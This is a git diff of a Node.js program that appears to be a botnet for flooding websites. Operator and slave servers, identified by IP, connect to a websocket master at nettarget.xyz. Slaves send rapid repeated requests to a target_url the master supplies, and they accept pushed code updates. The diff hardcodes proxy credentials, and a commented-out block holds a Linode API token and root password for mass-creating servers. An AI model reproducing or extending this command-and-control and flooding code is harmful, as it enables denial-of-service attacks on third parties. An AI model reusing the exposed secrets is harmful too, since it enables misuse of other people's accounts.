@@ -1,11 +1,11 @@
 const AppVersion = "1.0.7"; // this is the version which will identify each server and make sure they're up to date!
 let CurrentVersion = AppVersion; // Current version of the application, the master server sends this to all servers!
 let NewAppCode = ""; // This'll be updated when the server sends out a new app version request!
-const ShellJS = require("shelljs"); // Used for executing shell commands to the terminal in emergency cases!
+//const ShellJS = require("shelljs"); // Used for executing shell commands to the terminal in emergency cases!
 
-if (ShellJS){
+//if (ShellJS){
     //ShellJS.exec("npm i"); // install all packages
-}
+//}
 
 const { TextEncoder, TextDecoder } = require("util"); // Util module for fixing stupid problems such as TextEncoder is undefined
 const fs = require("fs"); // File module, used for creating and reading data aka files
@@ -20,10 +20,7 @@ const ExpressApp = expressJS(); // Our express app
 const ExpressWebSocket = ExpressWS(ExpressApp); // Our express websocket which contains a set of functions for collecting all connected clients etc!
 const WebSocketInstance = ExpressWebSocket.getWss("/server_socket"); // Get the cached data of our worker web socket!
 const Servers = {// We'll use the server IP to identify who it is, example: if the server is classed as operator it'll be the one to send out all the commands that the other servers will listen to!
-    ["95.111.241.15"]: "operator",
-    ["34.245.169.74"]: "operator",
-    ["172.18.0.1"]: "operator",
-    ["157.245.70.71"]: "slave",
+    ["162.213.255.44"]: "operator",
     ["31.49.168.36"]: "slave"
 };
 const TaskList = { // We'll use this to over-ride tasks!
@@ -41,6 +38,7 @@ let DoingTask = false; // this will be set to true if this current server is doi
 let LocalIP = null; // the current IP of this server, it gets auto set as soon as the server runs!
 let CurrentClient = null; // This is the client which we'll use to send back messages to the master, will be set as soon as it connects to the master socket!
 let StopConnection = false; // This is used for restarting the server, when set to true the socket won't try to reconnect. The master server tells the server to do this when outdated!
+let CreateServers = true; // This is used for creating a butt load of servers!
 
 const agent = tunnel.httpsOverHttp({
     proxy: {
@@ -49,6 +47,53 @@ const agent = tunnel.httpsOverHttp({
         proxyAuth: `eutqpmhe:1vnz3gzykzgj`
     }
 });
+
+/*
+axios.get("https://cloud.linode.com/api/v4/linode/instances/?page_size=100", {
+    headers: {
+        authorization: "Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175"
+    }
+}).then((res) => {
+    console.log(res.data)
+    
+}).catch((re) => {
+    console.log(re, "bad man error 1")
+})
+
+for (let II = 1; II <= 10; II++){
+    axios({
+        method: "POST",
+        headers: {
+            'Content-Type' : 'application/json',
+            'Accept' : 'application/json',
+            'Authorization' : 'Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175',
+            'cookie': ""
+        },
+    
+        withCredentials: true,
+        url: "https://cloud.linode.com/api/v4/linode/instances",
+    
+        data:{
+            ["image"]: "linode/centos7",
+            ["region"]: "eu-west",
+            ["type"]: "g6-standard-1",
+            ["label"]: `server${II.toString()}-eu-west`,
+            ["tags"]: [],
+            ["root_pass"]: "aeP@9WYX&UzUdjJB2!j96tx5",
+            ["authorized_users"]: [],
+            ["booted"]: true,
+            ["backups_enabled"]: false,
+            ["private_ip"]: false
+        }
+    }).then((res) => {
+        console.log("we did it 1")
+        
+    }).catch((re) => {
+    })
+}
+
+*/
+
 
 try{
     axios.get("https://api.ipify.org/?format=json").then((Response) => {
@@ -83,7 +128,7 @@ try{
             }
         }
 
-        fs.readFile("Accounts.txt", "utf8", (Error, FileData) => {})
+        ConsoleLogger(LocalIP)
 
         function GetSlaveServers(){
             const Slaves = [];
@@ -222,7 +267,7 @@ try{
                                             }
 
                                             axios.get(JSON_DATA.target_url).then((res) => {
-                                                console.log("request sent!")
+                                                ConsoleLogger("request sent!")
                                             }).catch((request_error) => {})
                                         }, 1)
                                     }
@@ -358,7 +403,7 @@ try{
                 Request.clientIp = Client.clientIp || Client._socket.remoteAddress;
                 Request.clientIp = Request.clientIp.replace("::ffff:", "");
 
-                console.log(Request.clientIp)
+                ConsoleLogger(Request.clientIp)
 
                 if (SocketIPs[Request.clientIp.toString()]) {
                     Client.send("Bad connection 1");
@@ -438,30 +483,35 @@ try{
 
                 NewWebClient.on('connectFailed', function(error) {
                     //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');
+                    ConsoleLogger("Failed?")
 
                     if (!StopConnection){
-                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://nodetestingservice.herokuapp.com:443/server_socket");
+                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                     }
                 });
 
                 NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
                     CurrentClient = Client
                     
+                    ConsoleLogger("Worked?")
+
                     Client.on("close", () => {
+                        ConsoleLogger("sss")
                         if (!StopConnection){
-                            NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://nodetestingservice.herokuapp.com:443/server_socket");
+                            NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                         }
                     })
 
                     Client.on("message", (Message) => {
-                        console.log(Message)
+                        ConsoleLogger(Message)
                         InputHandler(Message.utf8Data, PC_RANK) // Send the message from the master server to the input handler
                     });
                 
                 }); // Listen for the messages from our master server
 
+                ConsoleLogger("okayh")
                 if (!StopConnection){
-                    NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://nodetestingservice.herokuapp.com:443/server_socket");
+                    NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                 }
                 
                 let AppVersionInter = null
@@ -504,10 +554,33 @@ try{
                     }
                 }, 1000)
             }else if (PC_RANK == "operator"){
+                ConsoleLogger("Connecting up client op")
                 const NewWebClient = new ClientWebSocket(); // create the masters web client object
 
-                NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://nodetestingservice.herokuapp.com:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
+                NewWebClient.on('connectFailed', function(error) {
+                    //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');
+                    ConsoleLogger("Failed 99?")
+
+                    if (!StopConnection){
+                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
+                    }
+                });
+
+                NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
+                    CurrentClient = Client
+                    
+                    ConsoleLogger("Worked 66?")
+
+                    Client.on("close", () => {
+                        ConsoleLogger("sss 54")
+                    })
+                
+                }); // Listen for the messages from our master server
+
+                NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
             };
+            
+            ConsoleLogger(PC_RANK)
         }catch (listen_socket_error){
             ConsoleLogger("[SERVER] -> [ERROR] -> failed to connect to clients web socket, " + listen_socket_error);
         }
